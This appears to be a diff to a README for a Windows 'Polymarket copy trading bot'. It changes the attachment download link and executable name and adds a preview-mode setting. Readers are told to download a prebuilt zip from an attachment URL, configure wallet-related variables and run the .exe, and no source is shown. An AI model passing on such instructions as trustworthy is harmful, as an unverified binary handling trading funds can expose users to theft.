@@ -24,9 +24,9 @@
 ## 🚀 Let's Trade!!
 
 ### **🤖 Polymarket Copy Trading Rust Bot - for Windows**
-- 🗂️ [polymarket-copy-trading-bot-prod.zip](https://github.com/user-attachments/files/25134148/polymarket-copy-trading-bot-prod.zip)
+- 🗂️ [polymarket-copy-trading-bot-x86_64.zip](https://github.com/user-attachments/files/25414423/polymarket-copy-trading-bot-x86_64.zip)
 
-1. 📂 Extract `polymarket-copy-trading-bot-prod.zip` file.
+1. 📂 Extract `polymarket-copy-trading-bot-x86_64.zip` file.
 2. ⚙️ Environment Variables Settings
    ```
    - USER_ADDRESSES=0xYourTraderAddress             # Traders to copy (comma-separated or JSON array)
@@ -38,8 +38,9 @@
    - COPY_SIZE=10.0                                 # PERCENTAGE: Percentage of trader's order (e.g., 10.0 = 10%)
    - MAX_ORDER_SIZE_USD=100.0                       # Maximum size for a single order in USD (default: 100.0)
    - MIN_ORDER_SIZE_USD=1.0                         # Minimum size for a single order in USD (default: 1.0)
+   - PREVIEW_MODE=true                              # true: Monitor trades but DO NOT execute them (safe testing), false: live trading
    ```
-3. ▶️ Run `polymarket-copy-trading-bot-prod.exe`
+3. ▶️ Run `polymarket-copy-trading-bot-x86_64.exe`
 
 ---
 <p float="left">
